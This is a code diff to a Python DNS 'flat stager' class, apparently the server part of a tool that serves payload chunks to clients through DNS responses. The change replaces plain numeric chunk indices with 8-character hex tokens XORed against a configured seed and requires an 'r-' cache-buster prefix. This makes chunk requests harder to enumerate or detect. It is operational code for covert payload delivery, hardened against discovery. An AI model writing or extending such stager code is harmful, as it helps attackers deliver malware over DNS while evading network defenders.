@@ -13,10 +13,15 @@ from ...config import DNS_STANDARD_SIZE
 from ...logging_util import log_event
 
 
+_CACHE_BUSTER_PREFIX = 'r-'
+_INDEX_TOKEN_HEX_LEN = 8
+_INDEX_TOKEN_MASK = 0xFFFFFFFF
+
+
 class DnsFlatStager(object):
     def __init__(self, base_domain, flat_chunks, flat_count, flat_meta,
-                 flat_chunk_size, rtype, cname_suffix, label_max_len, logger,
-                 send_response, send_empty_response):
+                 flat_chunk_size, index_seed, rtype, cname_suffix, label_max_len,
+                 logger, send_response, send_empty_response):
         self._base_domain = base_domain
         self._base_suffix = '.%s' % self._base_domain
         self._flat_chunks = flat_chunks
@@ -33,13 +38,16 @@ class DnsFlatStager(object):
         self._flat_count = flat_count
         self._flat_meta = flat_meta
         self._flat_chunk_size = flat_chunk_size
+        self._index_seed = self._normalize_index_seed(index_seed)
         self._rtype = rtype
         self._cname_suffix = cname_suffix
         self._label_max_len = label_max_len
         self._logger = logger
         self._send_response = send_response
         self._send_empty_response = send_empty_response
-        self._enabled = bool(self._flat_chunks and self._flat_count)
+        self._enabled = bool(
+            self._flat_chunks and self._flat_count and self._index_seed is not None
+        )
         if self._enabled:
             meta_count = self._parse_flat_meta_count(self._flat_meta)
             log_event(
@@ -102,6 +110,27 @@ class DnsFlatStager(object):
                 return False
         return True
 
+    @staticmethod
+    def _normalize_index_seed(seed):
+        if seed is None:
+            return None
+        try:
+            seed_value = int(seed)
+        except (TypeError, ValueError):
+            return None
+        if seed_value < 0 or seed_value > _INDEX_TOKEN_MASK:
+            return None
+        return seed_value
+
+    @staticmethod
+    def _is_hex_token(label):
+        if not label or len(label) != _INDEX_TOKEN_HEX_LEN:
+            return False
+        for ch in label:
+            if ch not in '0123456789abcdef':
+                return False
+        return True
+
     @property
     def enabled(self):
         return self._enabled
@@ -122,6 +151,8 @@ class DnsFlatStager(object):
             return False
         cache_label, selector = parts
         if not cache_label or self._is_base32_label(cache_label):
+            return False
+        if not cache_label.startswith(_CACHE_BUSTER_PREFIX):
             return False
         if selector == 'count':
             if not self._flat_meta:
@@ -151,8 +182,8 @@ class DnsFlatStager(object):
                 },
             )
             return True
-        index_text = selector
-        if len(index_text) != 5 or not index_text.isdigit():
+        token_text = selector
+        if not self._is_hex_token(token_text):
             self._send_empty_response(
                 query_id, qname, qtype, addr,
                 reason='flat_invalid',
@@ -162,11 +193,29 @@ class DnsFlatStager(object):
                 self._logger,
                 logging.DEBUG,
                 'dns.flat_invalid',
-                'DNS flat stager invalid index',
-                lambda: {'dns_id': query_id, 'index': index_text},
+                'DNS flat stager invalid token',
+                lambda: {'dns_id': query_id, 'token': token_text},
             )
             return True
-        index = int(index_text)
+        try:
+            token = int(token_text, 16)
+        except (TypeError, ValueError):
+            token = None
+        if token is None:
+            self._send_empty_response(
+                query_id, qname, qtype, addr,
+                reason='flat_invalid',
+                include_opt=False,
+            )
+            log_event(
+                self._logger,
+                logging.DEBUG,
+                'dns.flat_invalid',
+                'DNS flat stager token parse failed',
+                lambda: {'dns_id': query_id, 'token': token_text},
+            )
+            return True
+        index = (token ^ self._index_seed) & _INDEX_TOKEN_MASK
         if index < 1 or index > self._flat_count:
             self._send_empty_response(
                 query_id, qname, qtype, addr,
@@ -178,7 +227,7 @@ class DnsFlatStager(object):
                 logging.DEBUG,
                 'dns.flat_invalid',
                 'DNS flat stager index out of range',
-                lambda: {'dns_id': query_id, 'index': index},
+                lambda: {'dns_id': query_id, 'index': index, 'token': token_text},
             )
             return True
         payload = self._flat_chunks[index - 1]
@@ -191,6 +240,7 @@ class DnsFlatStager(object):
             lambda: {
                 'dns_id': query_id,
                 'index': index,
+                'token': token_text,
                 'count': self._flat_count,
                 'bytes': len(payload),
             },
